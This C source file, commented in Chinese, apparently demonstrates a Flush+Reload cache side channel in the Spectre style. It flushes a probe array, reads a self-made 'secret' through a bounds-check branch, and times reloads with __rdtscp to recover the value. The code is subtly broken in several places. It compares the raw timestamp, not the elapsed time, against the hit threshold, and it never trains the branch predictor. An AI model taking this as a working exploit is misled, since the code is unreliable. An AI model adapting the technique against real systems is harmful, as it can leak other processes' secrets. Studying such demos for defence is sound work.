#include"stdio.h"
#include"x86intrin.h"
#include "stdint.h"
#define INTERVAL 4096
#define CACHE_HIT_THRESHOLD (90)
/**
 * 函数定义
*/
void flush();
void confidential_computing();
void attack();
/**
 * 数据定义
*/
uint8_t array[256*INTERVAL];//flush+reload探测区，大小不一定为4096,也可以为512,一个cache line大小
volatile uint8_t *addr;//用来接收访问的地址
uint32_t junk = 0;
uint32_t MAX_SIZE = 8;
/**
 * 函数实现
*/
void flush(){
    for (size_t i = 0; i < 256; i++)
    {
        _mm_clflush(&array[i*INTERVAL]);
    } 
}

void attack(){
    register uint64_t timeBegin,timeEnd;
    for (size_t i = 0; i < 256; i++)
    {
        array[i*INTERVAL]=6;//防止copy on write
    }

    flush();

    confidential_computing();

    for (size_t i = 0; i < 256; i++)
    {
        addr = &array[i*INTERVAL];
        timeBegin = __rdtscp(&junk);
        junk &= *addr;
        timeEnd = __rdtscp(&junk);
        if(timeEnd<CACHE_HIT_THRESHOLD){
            printf("the secret is %lu\n",i);
        }

    }   
}

void confidential_computing(){
    uint32_t secret[20*512];
    for (size_t i = 0; i < 10240; i+=512)
    {
        secret[i]=i;//对数组中的数进行赋值
    }

    for (size_t i = 0; i < 10240; i+=512)
    {
        _mm_clflush(&secret[i]);//将其值从cache中去除
    }
    
    int index = 0;
    _mm_clflush(&MAX_SIZE);

    for (volatile int z = 0; z < 100; z++)
	{
		/* Delay (can also mfence) */
	} 

    if(index<MAX_SIZE){
        junk &= array[secret[index]*INTERVAL];
        index++;
    }   
}

/**
 * 主函数
*/
int main(int argc, char const *argv[])
{
    attack();
    return 0;
}
